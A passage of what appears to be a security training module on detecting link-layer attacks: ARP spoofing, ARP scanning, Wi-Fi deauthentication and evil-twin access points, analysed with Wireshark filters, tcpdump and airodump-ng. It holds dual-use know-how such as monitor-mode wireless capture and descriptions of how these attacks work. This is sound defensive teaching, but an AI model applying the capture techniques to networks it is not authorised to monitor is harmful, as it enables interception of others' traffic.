@@ -1,0 +1,1240 @@
+<html><head></head><body>
+  <div class="container">
+<link rel="stylesheet" href="modules\style.css">
+<h1 id="intermediate-network-traffic-analysis">Intermediate Network Traffic Analysis</h1>
+<h2 id="arp-spoofing-abnormality-detection">ARP Spoofing &amp; Abnormality Detection</h2>
+<p><strong>Related PCAP File(s)</strong>:</p>
+<ul>
+<li><code>ARP_Spoof.pcapng</code></li>
+</ul>
+<hr>
+<p>The <code>Address Resolution Protocol (ARP)</code> has been a longstanding utility exploited by attackers to launch man-in-the-middle and denial-of-service attacks, among others. Given this prevalence, ARP forms a focal point when we undertake traffic analysis, often being the first protocol we scrutinize. Many ARP-based attacks are broadcasted, not directed specifically at hosts, making them more readily detectable through our packet sniffing techniques.</p>
+<h3 id="how-address-resolution-protocol-works">How Address Resolution Protocol Works</h3>
+<p>Before identifying ARP anomalies, we need to first comprehend how this protocol functions in its standard, or 'vanilla', operation.</p>
+<p><img src="storage\modules\229\ARP-protocol.png" alt="ARP Protocol"></p>
+<p>In our network, hosts must know the physical address (MAC address) to which they must send their data. This need gave birth to ARP. Let's elucidate this with a step-by-step process.</p>
+<table data-header-hidden=""><thead><tr><th width="125"></th><th></th></tr></thead><tbody><tr><td><strong>Step</strong></td><td><strong>Description</strong></td></tr><tr><td><code>1</code></td><td>Imagine our first computer, or Host A, needs to send data to our second computer, Host B. To achieve successful transmission, Host A must ascertain the physical address of Host B.</td></tr><tr><td><code>2</code></td><td>Host A begins by consulting its list of known addresses, the ARP cache, to check if it already possesses this physical address.</td></tr><tr><td><code>3</code></td><td>In the event the address corresponding to the desired IP isn't in the ARP cache, Host A broadcasts an ARP request to all machines in the subnet, inquiring, "Who holds the IP x.x.x.x?"</td></tr><tr><td><code>4</code></td><td>Host B responds to this message with an ARP reply, "Hello, Host A, my IP is x.x.x.x and is mapped to MAC address aa:aa:aa:aa:aa:aa."</td></tr><tr><td><code>5</code></td><td>On receiving this response, Host A updates its ARP cache with the new IP-to-MAC mapping.</td></tr><tr><td><code>6</code></td><td>Occasionally, a host might install a new interface, or the IP address previously allocated to the host might expire, necessitating an update and remapping of the ARP cache. Such instances could introduce complications when we analyze our network traffic.</td></tr></tbody></table>
+
+<hr>
+<h3 id="arp-poisoning-spoofing">ARP Poisoning &amp; Spoofing</h3>
+<p>In an ideal scenario, robust controls would be in place to thwart these attacks, but in reality, this isn't always feasible. To comprehend our Indicators of Compromise (IOCs) more effectively, let's delve into the behavior of ARP Poisoning and Spoofing attacks.</p>
+<p><img src="storage\modules\229\ARP-spoofing-poisoning.png" alt="ARP Cache Poisoning"></p>
+<p>Detecting these attacks can be challenging, as they mimic the communication structure of standard ARP traffic. Yet, certain ARP requests and replies can reveal their nefarious nature. Let's illustrate how these attacks function, enabling us to better identify them during our traffic analysis.</p>
+<table data-header-hidden=""><thead><tr><th width="130"></th><th></th></tr></thead><tbody><tr><td><strong>Step</strong></td><td><strong>Description</strong></td></tr><tr><td><code>1</code></td><td>Consider a network with three machines: the victim's computer, the router, and the attacker's machine.</td></tr><tr><td><code>2</code></td><td>The attacker initiates their ARP cache poisoning scheme by dispatching counterfeit ARP messages to both the victim's computer and the router.</td></tr><tr><td><code>3</code></td><td>The message to the victim's computer asserts that the gateway's (router's) IP address corresponds to the physical address of the attacker's machine.</td></tr><tr><td><code>4</code></td><td>Conversely, the message to the router claims that the IP address of the victim's machine maps to the physical address of the attacker's machine.</td></tr><tr><td><code>5</code></td><td>On successfully executing these requests, the attacker may manage to corrupt the ARP cache on both the victim's machine and the router, causing all data to be misdirected to the attacker's machine.</td></tr><tr><td><code>6</code></td><td>If the attacker configures traffic forwarding, they can escalate the situation from a denial-of-service to a man-in-the-middle attack.</td></tr><tr><td><code>7</code></td><td>By examining other layers of our network model, we might discover additional attacks. The attacker could conduct DNS spoofing to redirect web requests to a bogus site or perform SSL stripping to attempt the interception of sensitive data in transit.</td></tr></tbody></table>
+
+<p>Detecting these attacks is one aspect, but averting them is a whole different challenge. We could potentially fend off these attacks with controls such as:</p>
+<ol>
+<li><code>Static ARP Entries</code>: By disallowing easy rewrites and poisoning of the ARP cache, we can stymie these attacks. This, however, necessitates increased maintenance and oversight in our network environment.</li>
+<li><code>Switch and Router Port Security</code>: Implementing network profile controls and other measures can ensure that only authorized devices can connect to specific ports on our network devices, effectively blocking machines attempting ARP spoofing/poisoning.</li>
+</ol>
+<hr>
+<h3 id="installing-starting-tcpdump">Installing &amp; Starting TCPDump</h3>
+<p>To effectively capture this traffic, especially in the absence of configured network monitoring software, we can employ tools like <code>tcpdump</code> and <code>Wireshark</code>, or simply <code>Wireshark</code> for Windows hosts.</p>
+<p>We can typically find <code>tcpdump</code> located in <code>/usr/sbin/tcpdump</code>. However, if the tool isn't installed, it can be installed using the appropriate command, which will be provided based on the specific system requirements.</p>
+<p><strong>TCPDump</strong></p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ sudo apt install tcpdump -y
+</code></pre>
+<p>To initiate the traffic capture, we can employ the command-line tool <code>tcpdump</code>, specifying our network interface with the <code>-i</code> switch, and dictating the name of the output capture file using the <code>-w</code> switch.</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ sudo tcpdump -i eth0 -w filename.pcapng
+</code></pre>
+<h3 id="finding-arp-spoofing">Finding ARP Spoofing</h3>
+<p>For detecting ARP Spoofing attacks, we'll need to open the related traffic capture file (<code>ARP_Spoof.pcapng</code>) from this module's resources using Wireshark.</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ wireshark ARP_Spoof.pcapng
+</code></pre>
+<p>Once we've navigated to Wireshark, we can streamline our view to focus solely on ARP requests and replies by employing the filter <code>arp.opcode</code>.</p>
+<p><img src="storage\modules\229\ARP_Spoof_1.png" alt="ARP Spoofing Detection"></p>
+<p>A key red flag we need to monitor is any anomaly in traffic emanating from a specific host. For instance, one host incessantly broadcasting ARP requests and replies to another host could be a telltale sign of ARP spoofing.</p>
+<p>In such a scenario, we might identify that the MAC address <code>08:00:27:53:0C:BA is behaving suspiciously</code>.</p>
+<p>To ascertain this, we can fine-tune our analysis to inspect solely the interactions—both requests and replies—among the attacker's machine, the victim's machine, and the router. The opcode functionality in <code>Wireshark</code> can simplify this process.</p>
+<ol>
+<li><code>Opcode == 1</code>: This represents all types of ARP Requests</li>
+<li><code>Opcode == 2</code>: This signifies all types of ARP Replies</li>
+</ol>
+<p>As a preliminary step, we could scrutinize the requests dispatched using the following filter.</p>
+<ul>
+<li><code>arp.opcode == 1</code></li>
+</ul>
+<p><img src="storage\modules\229\ARP_Spoof_2.png" alt="ARP Spoofing Detection"></p>
+<p>Almost instantly, we should notice a red flag - an address duplication, accompanied by a warning message. If we delve into the details of the error message within Wireshark, we should be able to extract additional information.</p>
+<p><img src="storage\modules\229\ARP_Spoof_3.png" alt="ARP Spoofing Detection"></p>
+<p>Upon immediate inspection, we might discern that one IP address is mapped to two different MAC addresses. We can validate this on a Linux system by executing the appropriate commands.</p>
+<p><strong>ARP</strong></p>
+<p>ARP Spoofing &amp; Abnormality Detection</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ arp -a | grep <span class="hljs-number">50</span>:<span class="hljs-string">eb:</span><span class="hljs-string">f6:</span><span class="hljs-string">ec:</span><span class="hljs-number">0</span><span class="hljs-string">e:</span><span class="hljs-number">7</span>f
+
+? (192.168.10.4) at 50:<span class="hljs-string">eb:</span><span class="hljs-string">f6:</span><span class="hljs-string">ec:</span><span class="hljs-number">0</span><span class="hljs-string">e:</span><span class="hljs-number">7</span>f [ether] on eth0
+</code></pre>
+<p>ARP Spoofing &amp; Abnormality Detection</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ arp -a | grep <span class="hljs-number">08</span>:<span class="hljs-number">00</span>:<span class="hljs-number">27</span>:<span class="hljs-number">53</span>:<span class="hljs-number">0</span><span class="hljs-string">c:</span>ba
+
+? (192.168.10.4) at 08:<span class="hljs-number">00</span>:<span class="hljs-number">27</span>:<span class="hljs-number">53</span>:<span class="hljs-number">0</span><span class="hljs-string">c:</span>ba [ether] on eth0
+</code></pre>
+<p>In this situation, we might identify that our ARP cache, in fact, contains both MAC addresses allocated to the same IP address - an anomaly that warrants our immediate attention.</p>
+<p>To sift through more duplicate records, we can utilize the subsequent Wireshark filter.</p>
+<ul>
+<li><code>arp.duplicate-address-detected &amp;&amp; arp.opcode == 2</code></li>
+</ul>
+<hr>
+<h3 id="identifying-the-original-ip-addresses">Identifying The Original IP Addresses</h3>
+<p>A crucial question we need to pose is, what were the initial IP addresses of these devices? Understanding this aids us in determining which device altered its IP address through MAC spoofing. After all, if this attack was exclusively performed via ARP, the victim machine's IP address should remain consistent. Conversely, the attacker's machine might possess a different historical IP address.</p>
+<p>We can unearth this information within an ARP request and expedite the discovery process using this Wireshark filter.</p>
+<ul>
+<li><code>(arp.opcode) &amp;&amp; ((eth.src == 08:00:27:53:0c:ba) || (eth.dst == 08:00:27:53:0c:ba))</code></li>
+</ul>
+<p><img src="storage\modules\229\ARP_Spoof_4.png" alt="ARP Spoofing Detection"></p>
+<p>In this case, we might instantly note that the MAC address <code>08:00:27:53:0c:ba</code> was initially linked to the IP address <code>192.168.10.5</code>, but this was recently switched to <code>192.168.10.4</code>. This transition is indicative of a deliberate attempt at ARP spoofing or cache poisoning.</p>
+<p>Additionally, examining the traffic from these MAC addresses with the following Wireshark filter can prove insightful:</p>
+<ul>
+<li><code>eth.addr == 50:eb:f6:ec:0e:7f or eth.addr == 08:00:27:53:0c:ba</code></li>
+</ul>
+<p><img src="storage\modules\229\ARP_Spoof_5.png" alt="ARP Spoofing Detection"></p>
+<p>Right off the bat, we might notice some inconsistencies with TCP connections. If TCP connections are consistently dropping, it's an indication that the attacker is not forwarding traffic between the victim and the router.</p>
+<p>If the attacker is, in fact, forwarding the traffic and is operating as a man-in-the-middle, we might observe identical or nearly symmetrical transmissions from the victim to the attacker and from the attacker to the router.</p>
+<h2 id="arp-scanning-denial-of-service">ARP Scanning &amp; Denial-of-Service</h2>
+<hr>
+<p>We might discern additional aberrant behaviors within the ARP requests and replies. It is common knowledge that poisoning and spoofing form the core of most ARP-based <code>denial-of-service (DoS)</code> and <code>man-in-the-middle (MITM)</code> attacks. However, adversaries could also exploit ARP for information gathering. Thankfully, we possess the skills to detect and evaluate these tactics following similar procedures.</p>
+<h3 id="arp-scanning-signs">ARP Scanning Signs</h3>
+<p><strong>Related PCAP File(s)</strong>:</p>
+<ul>
+<li><code>ARP_Scan.pcapng</code></li>
+</ul>
+<p>Some typical red flags indicative of ARP scanning are:</p>
+<ol>
+<li><code>Broadcast ARP requests sent to sequential IP addresses (.1,.2,.3,...)</code></li>
+<li><code>Broadcast ARP requests sent to non-existent hosts</code></li>
+<li><code>Potentially, an unusual volume of ARP traffic originating from a malicious or compromised host</code></li>
+</ol>
+<h3 id="finding-arp-scanning">Finding ARP Scanning</h3>
+<p>Without delay, if we were to open the related traffic capture file (<code>ARP_Scan.pcapng</code>) in Wireshark and apply the filter <code>arp.opcode</code>, we might observe the following:</p>
+<p><img src="storage\modules\229\ARP_Scan_1.png" alt="ARP Scanning"></p>
+<p>It's possible to detect that indeed ARP requests are being propagated by a single host to all IP addresses in a sequential manner. This pattern is symptomatic of ARP scanning and is a common feature of widely-used scanners such as <code>Nmap</code>.</p>
+<p>Furthermore, we may discern that active hosts respond to these requests via their ARP replies. This could signal the successful execution of the information-gathering tactic by the attacker.</p>
+<hr>
+<h3 id="identifying-denial-of-service">Identifying Denial-of-Service</h3>
+<p><strong>Related PCAP File(s)</strong>:</p>
+<ul>
+<li><code>ARP_Poison.pcapng</code></li>
+</ul>
+<p>An attacker can exploit ARP scanning to compile a list of live hosts. Upon acquiring this list, the attacker might alter their strategy to deny service to all these machines. Essentially, they will strive to contaminate an entire subnet and manipulate as many ARP caches as possible. This strategy is also plausible for an attacker seeking to establish a man-in-the-middle position.</p>
+<p><img src="storage\modules\229\ARP_DoS_1.png" alt="ARP DoS"></p>
+<p>Promptly, we might note that the attacker's ARP traffic may shift its focus towards declaring new physical addresses for all live IP addresses. The intent here is to corrupt the router's ARP cache.</p>
+<p>Conversely, we may witness the duplicate allocation of <code>192.168.10.1</code> to client devices. This indicates that the attacker is attempting to corrupt the ARP cache of these victim devices with the intention of obstructing traffic in both directions.</p>
+<p><img src="storage\modules\229\ARP_DoS_2.png" alt="ARP DoS 2"></p>
+<h3 id="responding-to-arp-attacks">Responding To ARP Attacks</h3>
+<p>Upon identifying any of these ARP-related anomalies, we might question the suitable course of action to counter these threats. Here are a couple of possibilities:</p>
+<ol>
+<li><code>Tracing and Identification</code>: First and foremost, the attacker's machine is a physical entity located somewhere. If we manage to locate it, we could potentially halt its activities. On occasions, we might discover that the machine orchestrating the attack is itself compromised and under remote control.</li>
+<li><code>Containment</code>: To stymie any further exfiltration of information by the attacker, we might contemplate disconnecting or isolating the impacted area at the switch or router level. This action could effectively terminate a DoS or MITM attack at its source.</li>
+</ol>
+<p>Link layer attacks often fly under the radar. While they may seem insignificant to identify and investigate, their detection could be pivotal in preventing the exfiltration of data from higher layers of the OSI model.</p>
+<h2 id="802-11-denial-of-service">802.11 Denial of Service</h2>
+<p><strong>Related PCAP File(s)</strong>:</p>
+<ul>
+<li><code>deauthandbadauth.cap</code></li>
+</ul>
+<hr>
+<p>In the domain of traffic analysis, it is invariably critical to scrutinize all aspects of link-layer protocols and communications. A prominent type of link-layer attack is the one directed at <code>802.11 (Wi-Fi)</code>. Such an attack vector is often easy for us to disregard, but given that human errors can lead to the failure of our perimeter security, it is essential that we continually audit our wireless networks.</p>
+<h3 id="capturing-802-11-traffic">Capturing 802.11 Traffic</h3>
+<p>To examine our 802.11 raw traffic, we would require a <code>WIDS</code>/<code>WIPS</code> system or a wireless interface equipped with monitor mode. Similar to promiscuous mode in Wireshark, monitor mode permits us to view raw 802.11 frames and other packet types which might otherwise remain invisible.</p>
+<p>Let's assume we do possess a Wi-Fi interface capable of monitor mode. We could enumerate our wireless interfaces in Linux using the following command:</p>
+<p><strong>Wireless Interfaces</strong></p>
+<p>802.11 Denial of Service</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ iwconfig
+
+wlan0     IEEE <span class="hljs-number">802.11</span>  <span class="hljs-string">ESSID:</span>off/any  
+<span class="hljs-symbol">          Mode:</span>Managed  Access <span class="hljs-string">Point:</span> Not-Associated   Tx-Power=<span class="hljs-number">20</span> dBm   
+          Retry <span class="hljs-keyword">short</span>  <span class="hljs-keyword">long</span> <span class="hljs-string">limit:</span><span class="hljs-number">2</span>   RTS <span class="hljs-string">thr:</span>off   Fragment <span class="hljs-string">thr:</span>off
+          Power <span class="hljs-string">Management:</span>off
+</code></pre>
+<p>We have a couple of options to set our interface into monitor mode. Firstly, employing <code>airodump-ng</code>, we can use the ensuing command:</p>
+<p><strong>Airmon-NG</strong></p>
+<p>802.11 Denial of Service</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sudo airmon-ng start wlan0
+
+Found 2 processes that could cause trouble.
+Kill them using 'airmon-ng<span class="hljs-built_in"> check </span>kill' before putting
+the card in<span class="hljs-built_in"> monitor </span>mode, they will interfere by changing channels<span class="hljs-built_in">
+and </span>sometimes putting the interface back in managed mode
+
+    PID Name
+    820 NetworkManager
+   1389 wpa_supplicant
+
+PHY     Interface       Driver          Chipset
+
+phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
+                (mac80211<span class="hljs-built_in"> monitor </span>mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
+                (mac80211 station mode vif disabled for [phy0]wlan0)
+</code></pre>
+<p>Secondly, using system utilities, we would need to deactivate our interface, modify its mode, and then reactivate it.</p>
+<p><strong>Monitor Mode</strong></p>
+<p>802.11 Denial of Service</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sudo ifconfig wlan0 down
+root@htb[/htb]$ sudo iwconfig wlan0 mode<span class="hljs-built_in"> monitor
+</span>root@htb[/htb]$ sudo ifconfig wlan0 up
+</code></pre>
+<p>We could verify if our interface is in <code>monitor mode</code> using the <code>iwconfig</code> utility.</p>
+<p>802.11 Denial of Service</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ iwconfig
+
+wlan0mon  IEEE <span class="hljs-number">802.11</span>  <span class="hljs-string">Mode:</span>Monitor  <span class="hljs-string">Frequency:</span><span class="hljs-number">2.457</span> GHz  Tx-Power=<span class="hljs-number">20</span> dBm   
+          Retry <span class="hljs-keyword">short</span>  <span class="hljs-keyword">long</span> <span class="hljs-string">limit:</span><span class="hljs-number">2</span>   RTS <span class="hljs-string">thr:</span>off   Fragment <span class="hljs-string">thr:</span>off
+          Power <span class="hljs-string">Management:</span>off
+</code></pre>
+<p>It's possible that our interface doesn't conform to the <code>wlan0mon</code> convention. Instead, it might bear a name such as the following.</p>
+<p>802.11 Denial of Service</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ iwconfig
+
+wlan0     IEEE <span class="hljs-number">802.11</span>  <span class="hljs-string">Mode:</span>Monitor  <span class="hljs-string">Frequency:</span><span class="hljs-number">2.457</span> GHz  Tx-Power=<span class="hljs-number">20</span> dBm   
+          Retry <span class="hljs-keyword">short</span>  <span class="hljs-keyword">long</span> <span class="hljs-string">limit:</span><span class="hljs-number">2</span>   RTS <span class="hljs-string">thr:</span>off   Fragment <span class="hljs-string">thr:</span>off
+          Power <span class="hljs-string">Management:</span>off
+</code></pre>
+<p>The crucial factor here is that the mode should be "monitor". The name of the interface isn't particularly important, and in many cases, our Linux distribution might assign it a completely different name.</p>
+<p>To commence capturing traffic from our clients and network, we can employ <code>airodump-ng</code>. We need to specify our AP's channel with <code>-c</code>, its BSSID with <code>--bssid</code>, and the output file name with <code>-w</code>.</p>
+<p>802.11 Denial of Service</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sudo airodump-ng -c<span class="hljs-number"> 4 </span>--bssid F8:14:FE:4D:E6:F1 wlan0 -w raw
+
+BSSID              PWR RXQ  Beacons    <span class="hljs-comment">#Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID</span>
+F8:14:FE:4D:E6:F1  -23 <span class="hljs-number"> 64 </span>    <span class="hljs-number"> 115 </span>      <span class="hljs-number"> 6 </span>  <span class="hljs-number"> 0 </span> <span class="hljs-number"> 4 </span><span class="hljs-number"> 130 </span>  WPA2 CCMP   PSK  HTB-Wireless
+</code></pre>
+<p>We can use <code>tcpdump</code> to achieve similar outcomes, but airodump-ng proves equally effective.</p>
+<hr>
+<h3 id="how-deauthentication-attacks-work">How Deauthentication Attacks Work</h3>
+<p>Among the more frequent attacks we might witness or detect is a deauthentication/dissociation attack. This is a commonplace link-layer precursor attack that adversaries might employ for several reasons:</p>
+<ol>
+<li><code>To capture the WPA handshake to perform an offline dictionary attack</code></li>
+<li><code>To cause general denial of service conditions</code></li>
+<li><code>To enforce users to disconnect from our network, and potentially join their network to retrieve information</code></li>
+</ol>
+<p>In essence, the attacker will fabricate an 802.11 deauthentication frame pretending it originates from our legitimate access point. By doing so, the attacker might manage to disconnect one of our clients from the network. Often, the client will reconnect and go through the handshake process while the attacker is sniffing.</p>
+<p><img src="storage\modules\229\deauth-attack.png" alt="Deauthentication Attack"></p>
+<p>This attack operates by the attacker spoofing or altering the MAC of the frame's sender. The client device cannot really discern the difference without additional controls like IEEE 802.11w (Management Frame Protection). Each deauthentication request is associated with a reason code explaining why the client is being disconnected.</p>
+<p>In most scenarios, basic tools like <code>aireplay-ng</code> and <code>mdk4</code> employ reason <code>code 7</code> for deauthentication.</p>
+<h3 id="finding-deauthentication-attacks">Finding Deauthentication Attacks</h3>
+<p>To detect these potential attacks, we can open the related traffic capture file (<code>deauthandbadauth.cap</code>) as shown below.</p>
+<p><strong>Wireshark</strong></p>
+<p>802.11 Denial of Service</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ sudo wireshark deauthandbadauth.cap
+</code></pre>
+<p>If we wanted to limit our view to traffic from our AP's BSSID (<code>MAC</code>), we could use the following Wireshark filter:</p>
+<ul>
+<li><code>wlan.bssid == xx:xx:xx:xx:xx:xx</code></li>
+</ul>
+<p><img src="storage\modules\229\1-deauth.png" alt="Filtering to our BSSID"></p>
+<p>Suppose we wanted to take a look at the deauthentication frames from our BSSID or an attacker pretending to send these from our BSSID, we could use the following Wireshark filter:</p>
+<ul>
+<li><code>(wlan.bssid == xx:xx:xx:xx:xx:xx) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12)</code></li>
+</ul>
+<p>With this filter, we specify the type of frame (<code>management</code>) with <code>00</code> and the subtype (<code>deauthentication</code>) with <code>12</code>.</p>
+<p><img src="storage\modules\229\2-deauth.png" alt="Excessive Deauthentication"></p>
+<p>We might notice right away that an excessive amount of deauthentication frames were sent to one of our client devices. This would be an immediate indicator of this attack. Additionally, if we were to open the fixed parameters under wireless management, we might notice that reason <code>code 7</code> was utilized.</p>
+<p><img src="storage\modules\229\3-deauth.png" alt="Reason Code 7"></p>
+<p>As previously mentioned, if we wanted to verify this was done by an attacker, we should be able to filter even further for only deauthentication requests with reason <code>code 7</code>. As mentioned, <code>aireplay-ng</code> and <code>mdk4</code>, which are common attack tools, utilize this reason code by default. We could do with the following wireshark filter.</p>
+<ul>
+<li><code>(wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12) and (wlan.fixed.reason_code == 7)</code></li>
+</ul>
+<p><img src="storage\modules\229\4-deauth.png" alt="Excessive Reason Code 7"></p>
+<hr>
+<h3 id="revolving-reason-codes">Revolving Reason Codes</h3>
+<p>Alternatively, a more sophisticated actor might attempt to evade this innately obvious sign by revolving reason codes. The principle to this, is that an attacker might try to evade any alarms that they could set off with a wireless intrusion detection system by changing the reason code every so often.</p>
+<p>The trick to this technique of detection is incrementing like an attacker script would. We would first start with reason code 1.</p>
+<ul>
+<li><code>(wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12) and (wlan.fixed.reason_code == 1)</code></li>
+</ul>
+<p><img src="storage\modules\229\5-deauth.png" alt="Reason Code 1"></p>
+<p>Then we would shift over to reason code 2.</p>
+<ul>
+<li><code>(wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12) and (wlan.fixed.reason_code == 2)</code></li>
+</ul>
+<p><img src="storage\modules\229\6-deauth.png" alt="Reason Code 2"></p>
+<p>We would continue this sequence.</p>
+<ul>
+<li><code>(wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12) and (wlan.fixed.reason_code == 3)</code></li>
+</ul>
+<p><img src="storage\modules\229\7-deauth.png" alt="Reason Code 3"></p>
+<p>As such, deauthentication can be a pain to deal with, but we have some compensating measures that we can implement to prevent this from occuring in the modern day and age. These are:</p>
+<ol>
+<li><code>Enable IEEE 802.11w (Management Frame Protection) if possible</code></li>
+<li><code>Utilize WPA3-SAE</code></li>
+<li><code>Modify our WIDS/WIPS detection rules</code></li>
+</ol>
+<p><strong>Finding Failed Authentication Attempts</strong></p>
+<p>Suppose an attacker was to attempt to connect to our wireless network. We might notice an excessive amount of association requests coming from one device. To filter for these we could use the following.</p>
+<ul>
+<li><code>(wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 0) or (wlan.fc.type_subtype == 1) or (wlan.fc.type_subtype == 11)</code></li>
+</ul>
+<p><img src="storage\modules\229\1-fakeauth.png" alt="Excessive Authentication and Association 1"></p>
+<p>As such, it is important for us to be able to distinguish between legitimate 802.11 traffic and attacker traffic. Link-layer security in this perspective can mean the difference between perimiter compromise and our security.</p>
+<h2 id="rogue-access-point-evil-twin-attacks">Rogue Access Point &amp; Evil-Twin Attacks</h2>
+<p><strong>Related PCAP File(s)</strong>:</p>
+<ul>
+<li><code>rogueap.cap</code></li>
+</ul>
+<hr>
+<p>Addressing rogue access points and evil-twin attacks can seem like a gargantuan task due to their often elusive nature. Nevertheless, with the appropriate strategies in place, these illegitimate access points can be detected and managed effectively. In the realm of malevolent access points, rogue and evil-twin attacks invariably surface as significant concerns.</p>
+<p><img src="storage\modules\229\rogueap.png" alt="Rogue AP"></p>
+<p>A rogue access point primarily serves as a tool to circumvent perimeter controls in place. An adversary might install such an access point to sidestep network controls and segmentation barriers, which could, in many cases, take the form of hotspots or tethered connections. These rogue points have even been known to infiltrate air-gapped networks. Their primary function is to provide unauthorized access to restricted sections of a network. The critical point to remember here is that rogue access points are directly connected to the network.</p>
+<hr>
+<h3 id="evil-twin">Evil-Twin</h3>
+<p>An evil-twin on the other hand is spun up by an attacker for many other different purposes. The key here, is that in most cases these access points are not connected to our network. Instead, they are standalone access points, which might have a web server or something else to act as a man-in-the-middle for wireless clients.</p>
+<p><img src="storage\modules\229\evil-twin.png" alt="Evil-Twin"></p>
+<p>Attackers might set these up to harvest wireless or domain passwords among other pieces of information. Commonly, these attacks might also encompass a hostile portal attack.</p>
+<h3 id="airodump-ng-detection">Airodump-ng Detection</h3>
+<p>Right away, we could utilize the ESSID filter for Airodump-ng to detect Evil-Twin style access points.</p>
+<p>Rogue Access Point &amp; Evil-Twin Attacks</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sudo airodump-ng -c<span class="hljs-number"> 4 </span>--essid HTB-Wireless wlan0 -w raw
+
+ CH <span class="hljs-number"> 4 </span>][ Elapsed:<span class="hljs-number"> 1 </span>min ][ 2023-07-13 16:06    
+ BSSID              PWR RXQ  Beacons    <span class="hljs-comment">#Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID</span>
+ F8:14:FE:4D:E6:F2   -7<span class="hljs-number"> 100 </span>    <span class="hljs-number"> 470 </span>    <span class="hljs-number"> 155 </span>  <span class="hljs-number"> 0 </span> <span class="hljs-number"> 4 </span> <span class="hljs-number"> 54 </span>  OPN              HTB-Wireless
+ F8:14:FE:4D:E6:F1   -5 <span class="hljs-number"> 96 </span>    <span class="hljs-number"> 682 </span>      <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 0 </span> <span class="hljs-number"> 4 </span><span class="hljs-number"> 324 </span>  WPA2 CCMP   PSK  HTB-Wireless
+</code></pre>
+<p>The above example would show that in fact an attacker might have spun up an open access point that has an identical ESSID as our access point. An attacker might do this to host what is commonly referred to as a hostile portal attack. A hostile portal attack is used by attackers in order extract credentials from users among other nefarious actions.</p>
+<p>We might also want to be vigilant about deauthentication attempts, which could suggest enforcement measures from the attacker operating the evil-twin access point.</p>
+<p>To conclusively ascertain whether this is an anomaly or an Airodump-ng error, we can commence our traffic analysis efforts (<code>rogueap.cap</code>). To filter for beacon frames, we could use the following.</p>
+<ul>
+<li><code>(wlan.fc.type == 00) and (wlan.fc.type_subtype == 8)</code></li>
+</ul>
+<p><img src="storage\modules\229\1-evil-twin.png" alt="Beacon Analysis"></p>
+<p>Beacon analysis is crucial in differentiating between genuine and fraudulent access points. One of the initial places to start is the <code>Robust Security Network (RSN)</code> information. This data communicates valuable information to clients about the supported ciphers, among other things.</p>
+<p>Suppose we wish to examine our legitimate access point's RSN information.</p>
+<p><img src="storage\modules\229\2-evil-twin.png" alt="Beacon Analysis 2"></p>
+<p>It would indicate that WPA2 is supported with AES and TKIP with PSK as its authentication mechanism. However, when we switch to the illegitimate access point's RSN information, we may find it conspicuously missing.</p>
+<p><img src="storage\modules\229\3-evil-twin.png" alt="Beacon Analysis 3"></p>
+<p>In most instances, a standard evil-twin attack will exhibit this characteristic. Nevertheless, we should always probe additional fields for discrepancies, particularly when dealing with more sophisticated evil-twin attacks. For example, an attacker might employ the same cipher that our access point uses, making the detection of this attack more challenging.</p>
+<p>Under such circumstances, we could explore other aspects of the beacon frame, such as vendor-specific information, which is likely absent from the attacker's access point.</p>
+<h3 id="finding-a-fallen-user">Finding a Fallen User</h3>
+<p>Despite comprehensive security awareness training, some users may fall prey to attacks like these. Fortunately, in the case of open network style evil-twin attacks, we can view most higher-level traffic in an unencrypted format. To filter exclusively for the evil-twin access point, we would employ the following filter.</p>
+<ul>
+<li><code>(wlan.bssid == F8:14:FE:4D:E6:F2)</code></li>
+</ul>
+<p><img src="storage\modules\229\4-evil-twin.png" alt=""></p>
+<p>If we detect ARP requests emanating from a client device connected to the suspicious network, we would identify this as a potential compromise indicator. In such instances, we should record pertinent details about the client device to further our incident response efforts.</p>
+<ol>
+<li><code>Its MAC address</code></li>
+<li><code>Its host name</code></li>
+</ol>
+<p>Consequently, we might be able to instigate password resets and other reactive measures to prevent further infringement of our environment.</p>
+<h3 id="finding-rogue-access-points">Finding Rogue Access Points</h3>
+<p>On the other hand, detecting rogue access points can often be a simple task of checking our network device lists. In the case of hotspot-based rogue access points (such as Windows hotspots), we might scrutinize wireless networks in our immediate vicinity. If we encounter an unrecognizable wireless network with a strong signal, particularly if it lacks encryption, this could indicate that a user has established a rogue access point to navigate around our perimeter controls.</p>
+<h2 id="fragmentation-attacks">Fragmentation Attacks</h2>
+<p><strong>Related PCAP File(s)</strong>:</p>
+<ul>
+<li><code>nmap_frag_fw_bypass.pcapng</code></li>
+</ul>
+<hr>
